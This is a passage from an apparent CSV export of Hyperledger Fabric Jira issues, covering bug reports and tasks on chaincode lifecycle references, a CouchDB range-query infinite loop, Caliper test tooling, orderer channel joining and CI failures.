$ peer lifecycle chaincode approveformyorg -o localhost:7050 --ordererTLSHostnameOverride orderer.example.com --tls true --cafile /home/ubuntu/workspace/src/github.com/hyperledger/fabric-samples/test-network/organizations/ordererOrganizations/example.com/orderers/orderer.example.com/msp/tlscacerts/tlsca.example.com-cert.pem --channelID mychannel --name fabcar --version 2 --sequence 2

$ export CORE_PEER_TLS_ENABLED=true
$ export CORE_PEER_LOCALMSPID=""Org2MSP""
$ export CORE_PEER_TLS_ROOTCERT_FILE=${PWD}/organizations/peerOrganizations/org2.example.com/peers/peer0.org2.example.com/tls/ca.crt
$ export CORE_PEER_MSPCONFIGPATH=${PWD}/organizations/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp
$ export CORE_PEER_ADDRESS=localhost:9051
$ peer lifecycle chaincode approveformyorg -o localhost:7050 --ordererTLSHostnameOverride orderer.example.com --tls true --cafile /home/ubuntu/workspace/src/github.com/hyperledger/fabric-samples/test-network/organizations/ordererOrganizations/example.com/orderers/orderer.example.com/msp/tlscacerts/tlsca.example.com-cert.pem --channelID mychannel --name fabcar --version 2 --sequence 2
$ peer lifecycle chaincode commit -o localhost:7050 --ordererTLSHostnameOverride orderer.example.com --tls true --cafile /home/ubuntu/workspace/src/github.com/hyperledger/fabric-samples/test-network/organizations/ordererOrganizations/example.com/orderers/orderer.example.com/msp/tlscacerts/tlsca.example.com-cert.pem --channelID mychannel --name fabcar --peerAddresses localhost:7051 --tlsRootCertFiles /home/ubuntu/workspace/src/github.com/hyperledger/fabric-samples/test-network/organizations/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt --peerAddresses localhost:9051 --tlsRootCertFiles /home/ubuntu/workspace/src/github.com/hyperledger/fabric-samples/test-network/organizations/peerOrganizations/org2.example.com/peers/peer0.org2.example.com/tls/ca.crt --version 2 --sequence 2

$ peer lifecycle chaincode querycommitted -C mychannel -n fabcar
Committed chaincode definition for chaincode 'fabcar' on channel 'mychannel':Version: 2, Sequence: 2, Endorsement Plugin: escc, Validation Plugin: vscc, Approvals: [Org1MSP: true, Org2MSP: true]
$ peer lifecycle chaincode queryapproved -C mychannel -n fabcar
Approved chaincode definition for chaincode 'fabcar' on channel 'mychannel':
sequence: 2, version: 2, init-required: false, package-id: , endorsement plugin: escc, validation plugin: vscc

$ peer lifecycle chaincode queryinstalled -O json ## Problem: the updated references are wrong
{
        ""installed_chaincodes"": [
                {
                        ""package_id"": ""fabcar_1:88123f604c19b10b64aae3d9c7babf8099cf8aeb1cc6cc5771f47a27205584d1"",
                        ""label"": ""fabcar_1"",
                        ""references"": {
                                ""mychannel"": {
                                        ""chaincodes"": [
                                                {
                                                        ""name"": ""fabcar"",
                                                        ""version"": ""2""
                                                }
                                        ]
                                }
                        }
                }
        ]
}

## After restart the peer, the references are updated properly
$ docker restart peer0.org1.example.com
$ peer lifecycle chaincode queryinstalled -O json
{
        ""installed_chaincodes"": [
                {
                        ""package_id"": ""fabcar_1:88123f604c19b10b64aae3d9c7babf8099cf8aeb1cc6cc5771f47a27205584d1"",
                        ""label"": ""fabcar_1""
                }
        ]
}
{code}
These wrong references may mislead Fabric admins.
 So, we should fix the problem.",,tatsu-sato,ymlbright,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01cfv:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tatsu-sato,ymlbright,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Restructure protolator API,FAB-17934,45142,,Story,Backlog,FAB,Fabric,software,denyeart,,,Medium,,,caod,caod,28/May/20 4:17 AM,28/May/20 4:17 AM,28/Oct/23 3:10 AM,,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,"With protolator now being a part of the `fabric-config` library, there are some decisions we can make around what's exposed as part of the API for protolator as well. The protoext types probably do not need to be exported, but some tests in configtx need them (specifically ordererext.DynamicOrdererOrgGroup). Let's reconsider the design for what we can move around and make internal whether as a top level internal protoext package or something else.",,caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8zs0c",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
gossip.privdata logs warning message while processing config updates,FAB-17935,45145,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,caod,wlahti,wlahti,28/May/20 8:51 PM,30/May/20 12:40 AM,28/Oct/23 3:10 AM,30/May/20 12:40 AM,,,,,,,,,,,,,,fabric-gossip,,,,,,,,,0,ipm,,,,,"During a regular config update (for example, enabling V2_0 capabilities), gossip.privdata logs a warning message stating:
{code:java}
[e][Org2.peer0] 2020-05-28 07:46:18.721 EDT [gossip.privdata] getTxInfoFromTransactionBytes -> WARN 031 Invalid transaction type: header type is not an endorser transaction {code}
This does not need to be a warning message. At best, it should be a debug message (if logged at all). ",,caod,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzzzzy",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,wlahti,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"30/May/20 12:39 AM;caod;[https://github.com/hyperledger/fabric/pull/1350];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Create Tool To Convert CCC to Caliper Connection Profile,FAB-17936,45146,45139,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dongming,btl5037,btl5037,28/May/20 11:15 PM,25/Jun/20 12:12 AM,28/Oct/23 3:10 AM,25/Jun/20 12:12 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"Enhance the existing connection profile utility in Operator to also generate a Caliper specific connection profile

Acceptance Criteria: After calling and operator command a caliper specific connection profile is updated or created and located in the connection-profile directory of operator artifacts",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01cgb:",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add Caliper Callback File,FAB-17937,45147,45139,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dongming,btl5037,btl5037,28/May/20 11:17 PM,25/Jun/20 12:12 AM,28/Oct/23 3:10 AM,25/Jun/20 12:12 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"Caliper uses a callback file to register chaincode. Add a callback file that is specific to the chaincode used in barebones.

Acceptance Criteria: A caliper callback file exists as part of the resgression/barebones artifacts",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01cgj:",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Modify regression/barebones Target to Use Caliper,FAB-17938,45148,45139,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dongming,btl5037,btl5037,28/May/20 11:19 PM,25/Jun/20 12:12 AM,28/Oct/23 3:10 AM,25/Jun/20 12:12 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"Now that the pieces are in places, modify the Ginkgo test suite to remove any Operator-based Invoke, Query or Upgrade commands and replace these calls with Caliper driven workloads.

Acceptance Criteria: When I call `make regression/barebones` an end-to-end barebones test is run where the workload is driven by Caliper",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01cgr:",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
open ended range query results in an infinite loop,FAB-17939,45149,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,Senthil1,Senthil1,Senthil1,29/May/20 12:11 AM,29/May/20 2:41 PM,28/Oct/23 3:10 AM,29/May/20 2:41 PM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,,,,,,"We use a single scanner for achieving both paginated and non-paginated range query.

We have internalQueryLimit and pageSize.

For each _all_docs?startKey=""XXX""&endKey=""YYY"" REST API call to CouchDB, we fetch atmost internalQueryLimit number of records only by appending limit=internalQueryLimit.

When the requested pageSize is higher than the internalQueryLimit or the total number of records present in the given range is higher than the internalQueryLimit, iterator would execute the query again once the records fetched in the first cycle are consumed
and so on. In order to do that, after execution of the REST API in each cycle, the iterator updates the initially passed startKey to the nextStartKey. If there is no nextStartKey, it is set to the endKey.

Currently, when the nextStartKey and the endKey are the same, we still run one REST API call which is actually not needed as we always set inclusive_end=false. However, this causes infinite loop in a particular case. When we want to retrieve all the records, the user would submit an open-ended query by pass an empty string as the startKey and the endKey. When the startKey is an empty string, the REST API call would become _all_docs?endKey=""YYY"". When both are empty, it would become _all_docs

Given that we set the startKey to the endKey when there is no nextStartKey and still execute one REST API call, it gets into infinite loop by fetching all records again and again.",,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01cgz:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
TestCreateKeyStoreFailed not pass in release-1.4,FAB-17940,45150,,Bug,Unverified,FAB,Fabric,software,denyeart,,,Medium,,,haolipeng,haolipeng,29/May/20 5:00 PM,03/Jun/20 11:48 AM,28/Oct/23 3:10 AM,,v1.4.6,,,,,,,,,v1.x,,,,fabric-build,,,,,,,,,0,,,,,,"when i download  src of release-1.4, and bash unit-test/run.sh.

I get failed of TestCreateKeyStoreFailed, why?

dev env:

go: 1.12.17 

branch: release-1.4

os:cent-os

!image-2020-05-29-16-17-53-670.png!",,btl5037,haolipeng,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17941,,,,,,,,,,,,,,,,,,,,,,,,,"29/May/20 5:17 PM;haolipeng;image-2020-05-29-16-17-53-670.png;https://jira.hyperledger.org/secure/attachment/18341/image-2020-05-29-16-17-53-670.png",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-8461,,,No,,Unset,No,,,"1|i01ch7:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,haolipeng,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"03/Jun/20 11:48 AM;btl5037;I've tested this, there is no failure. You aren't expected to run the unit test script directly, do you encounter the error when running `make unit-test`?;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Azure Pipelines failed of branch-1.4 . why?,FAB-17941,45151,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Test Error,,haolipeng,haolipeng,29/May/20 5:15 PM,03/Jun/20 11:36 AM,28/Oct/23 3:10 AM,03/Jun/20 11:36 AM,v1.4.6,,,,,,,,,v1.x,,,,fabric-build,,,,,,,,,0,ci-failure,,,,,"Azure Pipelines failed of branch-1.4 . why?

!image-2020-05-29-16-14-27-036.png!",,btl5037,haolipeng,,,,,,,,,,,,,,,,,,,,FAB-17940,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"29/May/20 5:14 PM;haolipeng;image-2020-05-29-16-14-27-036.png;https://jira.hyperledger.org/secure/attachment/18340/image-2020-05-29-16-14-27-036.png",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01chf:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,haolipeng,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"03/Jun/20 11:36 AM;btl5037;If you run out to Azure Pipelines, its a test flake, its rerunning as we speak, not an actual failure.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add channel info provider to enable ledger to query all channel configs,FAB-17942,45153,44915,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wenjian,wenjian,wenjian,29/May/20 9:44 PM,04/Jun/20 10:25 PM,28/Oct/23 3:10 AM,03/Jun/20 11:40 PM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"Implement ChannelInfoProvider interface to enable ledger components to retrieve
all channel configs (current and previous channel configs). The interface will be used for checkpoint snapshot support and removing channel-specific couch dbs.",,denyeart,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01chv:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,wenjian,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"01/Jun/20 9:12 PM;denyeart;https://github.com/hyperledger/fabric/pull/1352;;;","03/Jun/20 9:53 PM;wenjian;Moved some code to another PR: [https://github.com/hyperledger/fabric/pull/1363];;;","04/Jun/20 10:25 PM;wenjian;Negative tests PR: [https://github.com/hyperledger/fabric/pull/1371];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Orderer w/o system-channel, joins app channel as member, with join-block",FAB-17943,45160,40570,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tock,tock,tock,31/May/20 7:35 PM,27/Jul/20 8:11 PM,28/Oct/23 3:10 AM,27/Jul/20 8:11 PM,,,,,,,,,,v2.2.0,,,,fabric-orderer,,,,,,,,,0,,,,,,"Join with a join-block number >0, onboarding needed.

Start a follower that pulls blocks until the join-block, then mutates into an etcdraft.Chain.

The follower.Chain pulls blocks up to the join block, without inspecting intermediate config blocks.

After the join-block is pulled, the follower chain is stopped and the ChannelCreate function is invoked.",,tock,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01cjf:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tock,,,,,,,,,,,,,,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
SDK-Node Removed Promise from Function,FAB-17944,45162,,Bug,Closed,FAB,Fabric,software,denyeart,,,Highest,Done,btl5037,btl5037,btl5037,01/Jun/20 4:17 AM,03/Jun/20 12:48 PM,28/Oct/23 3:10 AM,03/Jun/20 12:48 PM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"SDK-Node removed the synchronicity on the newDefaultKeyValueStore function. PTE previously received the promise by using the `.then()` function. The `.then()` function needs to be removed from PTE and replaced with our own blocking call, or handle the asynchronous nature of the new function.

Here is the change that modified this behaviour: [https://github.com/hyperledger/fabric-sdk-node/commit/c7f33a9bfa1ec3d54b685a3870b3fcaa21dfe404#diff-96a08d14555df4cbf4200a6216458fd8L73]",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0191g:i",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,release-2.1,release-2.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go